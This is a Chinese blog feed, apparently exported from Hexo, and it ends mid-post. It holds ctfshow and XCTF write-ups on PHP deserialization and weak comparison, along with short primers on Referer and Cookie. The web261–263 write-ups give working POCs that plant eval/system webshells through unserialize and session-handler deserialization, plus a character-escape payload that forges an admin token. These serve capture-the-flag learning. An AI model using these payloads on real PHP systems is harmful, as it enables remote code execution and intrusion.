src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309131920301.png"></p><p>发现了新的几个魔术方法，然后不太懂就去查看了一下信息，发现了__wakeup方法会在__<em>unserialize前执行，因为__unserialize会查看是否存在__wakeup然后先执行它，所以不考虑这个方法造成影响</em></p><p><em>然后__sleep方法会在执行__serialize时，先会调用这个函数，但是源码中并没有__serialize方法，而__invoke调用不到。最后需要处理的就是__unserialize和</em>_destruct了。对于第一个直接将两个参数修改为合适的即可，而第二个则知道弱比较可以绕过，而0x36d是十进制的877，那么可以使用877.php绕过了。</p><p>最后POC为：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshowvip</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"877.php"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php system($_GET["shell"]);?>'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token number">0x36d</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ctfshowvip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//O%3A10%3A%22ctfshowvip%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A7%3A%22877.php%22%3Bs%3A8%3A%22password%22%3Bs%3A31%3A%22%3C%3Fphp+system%28%24_GET%5B%22shell%22%5D%29%3B%3F%3E%22%3Bs%3A4%3A%22code%22%3Bi%3A877%3B%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问877.php然后进行RCE即可</p><blockquote><p>COPY一下别人的<a href="https://segmentfault.com/a/1190000007250604">笔记</a>：</p><ol><li>_construct()，类的构造函数</li><li>__destruct()，类的析构函数</li><li>__call()，在对象中调用一个不可访问方法时调用</li><li>__callStatic()，用静态方式中调用一个不可访问方法时调用</li><li>__get()，获得一个类的成员变量时调用</li><li>__set()，设置一个类的成员变量时调用</li><li>__isset()，当对不可访问属性调用isset()或empty()时调用</li><li>__unset()，当对不可访问属性调用unset()时被调用。</li><li>__sleep()，执行serialize()时，先会调用这个函数</li><li>__wakeup()，执行unserialize()时，先会调用这个函数</li><li>__toString()，类被当成字符串时的回应方法</li><li>__invoke()，调用函数的方式调用一个对象时的回应方法</li><li>__set_state()，调用var_export()导出类时，此静态方法会被调用。</li><li>__clone()，当对象复制完成时调用</li><li>__autoload()，尝试加载未定义的类</li><li>__debugInfo()，打印所需调试信息</li></ol></blockquote><h3 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309191739015.png"></p><p>查看源码的时候发现注释有个message.php，于是查看了该文件，发现了一个新的信息，然后根据题目要求对内容进行序列化后再base64编码传入cookie发现可以获得flag，但是如果通过index.php的信息获取flag则没有想法，后来发现属于字符逃逸内容，这个是新看到的内容，于是看着wp来复现学习。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">message</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$from</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$msg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$to</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$token</span><span class="token operator">=</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token variable">$m</span><span class="token punctuation">,</span><span class="token variable">$t</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">from</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">msg</span> <span class="token operator">=</span> <span class="token variable">$m</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">to</span> <span class="token operator">=</span> <span class="token variable">$t</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$msg</span><span class="token operator">-></span><span class="token property">token</span><span class="token operator">==</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><a href="https://www.cnblogs.com/ntrack/p/17723750.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8">字符逃逸</a></p><p>发现message.php中对传入的fuck进行了过滤，变成loveU，这会使得可控的字符变多一个，我们可以传入多一位字符内容，我们因此需要增多足够导致结果的序列化内容。（在反序列化中是通过匹配” { “ 和 “ } “来判断是否结束）</p><p>需要注入的内容：”;s:5:”token”;s:5:”admin”;} &#x2F;&#x2F;共27个字符所以需要27个fuck来完成注入</p><p>payload：?f&#x3D;1&amp;m2&#x3D;&amp;t&#x3D; fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck”;s:5:”token”;s:5:”admin”;}</p><p>注入结果：O:7:”message”:1:{s:2:”to”;s:135:”<strong>loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU”;s:5:”token”;s:5:”admin”;}</strong>“;}&#x2F;&#x2F;黑色的为注入to的结果，但是当反序列化的时候to的135个字符只到最后loveU,而”;s:5:”token”;s:5:”admin”;}成为新的属性，并且这个”  } “结束反序列，最后的;}则省略</p></blockquote><h3 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h3><p>打开只有这个，查看源码发现check.php的信息，但是打开没啥用，就扫描目录</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309251027830.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309251028785.png"></p><p>发现了flag.php打开没啥，还有<a href="http://www.zip,就下载了发现了一些源码,看到了session_start();是用来开启session记录登录次数,然后再审计一波代码/">www.zip，就下载了发现了一些源码，看到了session_start();是用来开启session记录登录次数，然后再审计一波代码</a></p><p>大概意思和思路：</p><blockquote><p>这是一道利用<a href="https://www.cnblogs.com/ntrack/p/17723750.html#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">session机制</a>的题目，利用setcookie为session赋值，有意思的是无论输入多少次都不会报错。<img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309251152772.png"></p><p>如果想要通过check.php，条件有点不足，因为sql注入被过滤了很多的关键字，无法获取数据库的信息。然后发现了inc.php中存在魔术方法、file_put_contents方法和session_start()、ini_set(‘session.serialize_handler’, ‘php’)于是猜测是利用session的反序列化漏洞来进行RCE。</p><p>通过上面session机制以及inc.php代码的了解，我们需要通过对象的序列化传入webshell，然后放置于一个php可执行文件中(username控制文件名字，password控制文件内容)</p><p>POC：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name-definition class-name">User</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>   <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token punctuation">;</span>   <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"2.php"</span><span class="token punctuation">;</span>       <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php  function fun($a)&#123;@eval($a);&#125;  @fun($_POST["shell"]); ?>'</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"|"</span><span class="token operator">.</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token comment">//fE86NDoiVXNlciI6Mjp7czo4OiJ1c2VybmFtZSI7czo1OiIyLnBocCI7czo4OiJwYXNzd29yZCI7czo2MjoiPD9waHAgIGZ1bmN0aW9uIGZ1bigkYSl7QGV2YWwoJGEpO30gIEBmdW4oJF9QT1NUWyJzaGVsbCJdKTsgPz4iO30%3D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在登录页面传入cookie的limit值，这里便是传入了cookie并使得session存入了值，然后再通过inc&#x2F;inc.php页面获取session的内容并进行反序列化，通过魔术方法和file_put_contenets对log-2.php进行写入，然后访问log-2.php进行RCE</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202309251246970.png"></p></blockquote><p>大概就是在php_serialize机制的页面传入session带” | “.序列化内容，然后访问php机制的页面，该页面寻找session存储地址获取其值，并将” | “后的内容进行反序列化</p><h2 id="反序列化总结一波"><a href="#反序列化总结一波" class="headerlink" title="反序列化总结一波"></a>反序列化总结一波</h2><p><strong>1.发送cookie 的值会自动进行 URL 编码， 接收时会进行 URL 解码，同时cookie会识别不到一些特殊字符</strong></p><p><strong>2.序列化中，只有类和变量会被序列化</strong></p><p><strong>3.对象序列化成的字节序列会包含对象的类型信息、对象的数据等，说白了就是包含了描述这个对象的所有信息，能根据这些信息“复刻”出一个和原来一模一样的对象</strong></p><p><strong>4.<a href="https://blog.csdn.net/u013119911/article/details/125519021">PHP反序列化进阶学习与总结</a></strong></p><p><strong>5.<a href="https://blog.csdn.net/m0_51911432/article/details/113764392">PHP序列化了解</a></strong></p><p><strong>6.<a href="https://blog.csdn.net/qq_45521281/article/details/105891381">PHP序列化和反序列化绕过</a></strong></p><p><strong>7.<a href="https://www.php.net/manual/zh/language.oop5.magic.php#object.sleep">魔术方法官方介绍</a>，<a href="https://segmentfault.com/a/1190000007250604">魔术方法详细介绍</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 题目集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf_show </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解Referer</title>
      <link href="/2023/05/28/Referer/"/>
      <url>/2023/05/28/Referer/</url>
      
        <content type="html"><![CDATA[<h1 id="Referer"><a href="#Referer" class="headerlink" title="Referer"></a>Referer</h1><p>Headers中的referer</p><blockquote><p>显示意义:表示你是从哪个网页来到这个网页的，如果直接通过网址进行请求则没有referer</p></blockquote><br><h2 id="盗链"><a href="#盗链" class="headerlink" title="盗链"></a>盗链</h2><blockquote><p>盗链是指服务提供商自己不提供服务的内容，通过技术手段（可以理解成爬虫）去获取其他网站的资源展示在自己的网站上。</p></blockquote><p><strong>种类</strong></p><blockquote><p>图片盗链、音频盗链、视频盗链、文件盗链</p></blockquote><p><strong>危害</strong></p><blockquote><p>会占据被盗链网站的带宽，而且被盗链网站真实被点击率极低，严重危害被盗链网站的利益</p></blockquote><p><strong>判断</strong></p><blockquote><p>正常的访问网站内容都会在本网站内一步一步点下去的，如果出现referer不是本网站，是其他网站的，则该referer是一个爬虫.</p></blockquote><p><strong>备注</strong></p><blockquote><p>可以通过设置referer进行防盗链，也可以进行绕过防盗链</p></blockquote><p><a href="https://www.sojson.com/blog/58.html">参考资料</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解Cookie</title>
      <link href="/2023/05/28/Cookie/"/>
      <url>/2023/05/28/Cookie/</url>
      
        <content type="html"><![CDATA[<h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><h3 id="Cookie是什么"><a href="#Cookie是什么" class="headerlink" title="Cookie是什么"></a>Cookie是什么</h3><blockquote><p>Cookie是一段不超过4KB的小型<strong>文本</strong>数据</p></blockquote><br><h3 id="Cookie的作用"><a href="#Cookie的作用" class="headerlink" title="Cookie的作用"></a>Cookie的作用</h3><p><strong>保存用户状态信息</strong>，当用户访问服务器的时候，服务器如果需要记录该用户就会颁发<strong>记录相关信息的Cookie</strong>给用户的浏览器，然后被浏览器保存。当再次访问该服务器的时候，浏览器会直接发送请求链接和该Cookie到服务器中。服务器会甄别该Cookie，进行操作。</p><blockquote><p>如第一次登录网站需要账号密码，当一定时间内再次登录就无需再次输入账号密码，而是直接呈现登录状态</p></blockquote><br><h3 id="Cookie机制"><a href="#Cookie机制" class="headerlink" title="Cookie机制"></a>Cookie机制</h3><p>客户端发送一个请求到服务器 ——&gt; 服务器发送一个HttpResponse响应到客户端，其中包含Set-Cookie的头部 ——&gt; 客户端保存cookie，之后向服务器发送请求时，HttpRequest请求中会包含一个Cookie的头部 ——&gt; 服务器返回响应数据</p><br><h3 id="Cookie的生命周期"><a href="#Cookie的生命周期" class="headerlink" title="Cookie的生命周期"></a>Cookie的生命周期</h3><p>cookie有2种存储方式</p><ul><li><pre><code>    一种是会话性      会话性：如果cookie为会话性，那么cookie仅会保存在客户端的内存中，当我们关闭客服端时cookie也就失效了</code></pre></li><li><pre><code>    一种是持久性。</code></pre></li></ul><p>持久性：如果cookie为持久性，那么cookie会保存在用户的硬盘中，直至生存期结束或者用户主动将其销毁。</p><br><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><strong>Cookie就是一些数据</strong>，用于存储服务器返回给客服端的信息，客户端进行保存。在下一次访问该网站时，客户端会将保存的cookie一同发给服务器，服务器再利用cookie进行一些操作。利用cookie我们就可以实现自动登录，保存游览历史，身份验证等功能。</p><p>引用:<br><a href="https://blog.csdn.net/m0_51545690/article/details/123359959">一篇文章彻底搞懂cookie</a><br><a href="https://www.jianshu.com/p/6fc9cea6daa2/">深入理解Cookie</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP比较类型</title>
      <link href="/2023/05/28/PHP/"/>
      <url>/2023/05/28/PHP/</url>
      
        <content type="html"><![CDATA[<h1 id="考点："><a href="#考点：" class="headerlink" title="考点："></a>考点：</h1><h2 id="1-PHP比较类型"><a href="#1-PHP比较类型" class="headerlink" title="1.PHP比较类型"></a>1.PHP比较类型</h2><ol><li><p>弱类型（&#x3D;&#x3D;)</p><p>会先把字符串类型转化成相同，再进行比较。<strong>该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">例子：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"123"</span><span class="token operator">==</span><span class="token number">123</span><span class="token punctuation">)</span>  <span class="token comment">//true</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"12admin"</span><span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token comment">//true</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin12"</span><span class="token operator">==</span><span class="token number">12</span><span class="token punctuation">)</span>  <span class="token comment">//false</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"admin12"</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment">//true</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"1e1"</span><span class="token operator">==</span><span class="token number">1e1</span><span class="token punctuation">)</span>  <span class="token comment">//true</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0e1"</span><span class="token operator">==</span><span class="token number">0e102301</span><span class="token punctuation">)</span>  <span class="token comment">//truee是科学计数法，0乘以任何数都等于0</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>强类型（&#x3D;&#x3D;&#x3D;）</p><p>会先判断两个比较元素类型是否相同，再比较</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">例子：<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'123'</span><span class="token operator">===</span><span class="token number">123</span><span class="token punctuation">)</span> <span class="token comment">//false</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token number">123</span> <span class="token operator">===</span> <span class="token number">123</span><span class="token punctuation">)</span> <span class="token comment">//true   </span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">//false    </span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF题目——easyphp</title>
      <link href="/2023/05/28/xctf-easyphp/"/>
      <url>/2023/05/28/xctf-easyphp/</url>
      
        <content type="html"><![CDATA[<p><a href="https://adworld.xctf.org.cn/challenges/list">easyphp</a></p><h1 id="类型：PHP代码审计"><a href="#类型：PHP代码审计" class="headerlink" title="类型：PHP代码审计"></a>类型：PHP代码审计</h1><h3 id="1-审查传值"><a href="#1-审查传值" class="headerlink" title="1.审查传值"></a>1.审查传值</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-观看分析条件"><a href="#2-观看分析条件" class="headerlink" title="2.观看分析条件"></a>2.观看分析条件</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">从上往下看<span class="token punctuation">:</span><span class="token number">1.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token number">2.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">3.</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token number">4.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token number">5.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token number">6.</span><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token number">7.</span><span class="token variable">$d</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no..."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span><span class="token number">8.</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no......"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token number">9.</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="分析"><a href="#分析" class="headerlink" title="分析:"></a><strong>分析:</strong></h4><ol><li><h5 id="要求传入a值，并且a的整数值要大于6000000，还要a的长度小于等于3"><a href="#要求传入a值，并且a的整数值要大于6000000，还要a的长度小于等于3" class="headerlink" title="要求传入a值，并且a的整数值要大于6000000，还要a的长度小于等于3"></a>要求传入a值，并且a的整数值要大于6000000，还要a的长度小于等于3</h5><blockquote><p>通过php的弱比较可以想到输入a&#x3D;1e9，e代表科学计数法。</p></blockquote></li><li><h5 id="要求传入b值，并且b值的md5哈希值的后6位为8b184b"><a href="#要求传入b值，并且b值的md5哈希值的后6位为8b184b" class="headerlink" title="要求传入b值，并且b值的md5哈希值的后6位为8b184b"></a>要求传入b值，并且b值的md5哈希值的后6位为8b184b</h5><blockquote><p>通过使用python写个码来实现暴力破解，最终值为53724</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php">import hashlibdef <span class="token function">find_collision</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token class-name return-type">counter</span> <span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment"># 暴力破解</span>    <span class="token keyword">while</span> <span class="token constant boolean">True</span><span class="token punctuation">:</span>        message <span class="token operator">=</span> <span class="token function">str</span><span class="token punctuation">(</span>counter<span class="token punctuation">)</span>        md5 <span class="token operator">=</span> hashlib<span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span>message<span class="token operator">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment"># 获取后6位为8b184b的MD5加密码</span>        <span class="token keyword">if</span> md5<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> test<span class="token punctuation">:</span>            <span class="token keyword">return</span> message        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span>        counter <span class="token operator">+=</span> <span class="token number">1</span><span class="token comment"># 代入测试</span>test <span class="token operator">=</span> <span class="token string single-quoted-string">'8b184b'</span>message <span class="token operator">=</span> <span class="token function">find_collision</span><span class="token punctuation">(</span>test<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Message:"</span><span class="token punctuation">,</span> message<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"MD5(Message):"</span><span class="token punctuation">,</span> hashlib<span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span>message<span class="token operator">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token function">hexdigest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><h5 id="传入json格式的c值，并将其转化为PHP数组变量"><a href="#传入json格式的c值，并将其转化为PHP数组变量" class="headerlink" 